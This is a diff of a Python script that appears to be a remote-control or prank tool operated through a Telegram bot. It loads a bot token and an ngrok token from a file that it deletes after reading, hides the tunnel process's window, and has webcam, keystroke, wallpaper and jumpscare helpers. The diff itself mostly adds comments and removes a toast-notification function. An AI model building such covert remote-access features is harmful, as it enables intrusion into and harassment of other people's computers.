@@ -57,7 +57,6 @@ from tempfile import gettempdir
 from typing import Any, Callable
 from time import monotonic, sleep
 from random import choice, randint
-from winotify import audio, Notification
 from cryptography.fernet import Fernet
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
@@ -66,7 +65,7 @@ from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, r
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN, KEY_UP
 from os.path import join, abspath, isdir, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize
 
-
+# This is needed to understand if the file was compiled or not
 FROZEN = getattr(sys, 'frozen', False)
 def resource_path(relative_path: str) -> str:
     if FROZEN:
@@ -83,7 +82,7 @@ def load_dll(path: str) -> None:
     except Exception as e:
         print(f"Error while loading the dll: {path}\n{e}")
 
-# CONSTANTS
+# SETUP CONSTANTS
 logging = True
 iswindows = name == "nt"
 islinux = not iswindows
@@ -110,6 +109,7 @@ except Exception as e:
     print(e)
     exit()
 
+# algoritm to get the key from the obfuscated key file
 def get_real_key(key_path):
     if not os.path.isfile(key_path):
         raise RuntimeError(f"key.key not found: {key_path}")
@@ -160,7 +160,9 @@ if isdir(DLLS_DIR):
             load_dll(join(DLLS_DIR, file))
 else:
     print(f"DLLS directory not does not exist or it was empty: {DLLS_DIR}")
-#UTILS
+
+# UTILS
+# We import utils here so DLLS needed for modules are pre-loaded
 from utils import *
 try:
     from plugins import *
@@ -168,6 +170,7 @@ except ImportError as e:
     print(f"Plugins not loaded\n{e}\n")
     plugins = None
 
+# This is needed so pyngrok is windowless and doesn't spawn a terminal window
 def _patched_popen(*args, **kwargs):
     cmd_list = []
     if args:
@@ -245,7 +248,7 @@ def check_webcam():
 def now() -> str:
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-#GETTING TOKEN AND CHAT_ID
+# GETTING TOKEN AND CHAT_ID
 def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
     """
     returns token, chatid, ngrok_token, tunnel_provider
@@ -263,7 +266,8 @@ def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
         remove(filename)
     return var["token"],var["chatid"],var["ngrok_token"],var["tunnel_provider"]
         
-#Resizing assets so they all take the same time to load when doing jumpscares(I guess)
+# Resizing assets so they all take the same time to load when doing jumpscares
+# or at lest that's what I think it should do
 def compress_and_resize_image(image_array, target_size=(1920, 1080), quality=30) -> np.array:
     img = Image.fromarray(image_array)
     img_resized = img.resize(target_size, Image.Resampling.LANCZOS)
@@ -341,6 +345,9 @@ def get_required_params(func):
     ]
 
 def backup_wallpaper(backup_path):
+    """
+    returns True if the operation was successful else False
+    """
     current_wallpaper = get_current_wallpaper()
     if exists(current_wallpaper):
         copy2(current_wallpaper, backup_path)
@@ -348,7 +355,10 @@ def backup_wallpaper(backup_path):
     else:
         return False
 
-def change_wallpaper(image_path):
+def change_wallpaper(image_path) -> bool:
+    """
+    returns True if the wallpaper was changed else False
+    """
     SPI_SETDESKWALLPAPER = 20  
     SPIF_UPDATEINIFILE = 0x01  
     SPIF_SENDWININICHANGE = 0x02  
@@ -361,6 +371,7 @@ def change_wallpaper(image_path):
         return False
 
 def pad_to_16_9(image):
+    # Forces an image to be 16:9 using black padding
     height, width = image.shape[:2]
     current_ratio = width / height
     target_ratio = 16 / 9
@@ -376,17 +387,7 @@ def pad_to_16_9(image):
         padded = copyMakeBorder(image, 0, 0, pad, new_width - width - pad, BORDER_CONSTANT, value=(0, 0, 0))
     return padded
 
-def notify_toast(appname: str, title: str, message: str, url_label: str, url: str) -> None:
-    toast = Notification(
-        app_id=appname, 
-        title=title,
-        msg=message,
-        duration="short",
-    )
 
-    toast.add_actions(label=url_label, launch=url)
-    toast.set_audio(audio.Default, loop=False)
-    toast.show()
 
 def terminate_process_by_name(process_name: str) -> None:
     for proc in psutil.process_iter():
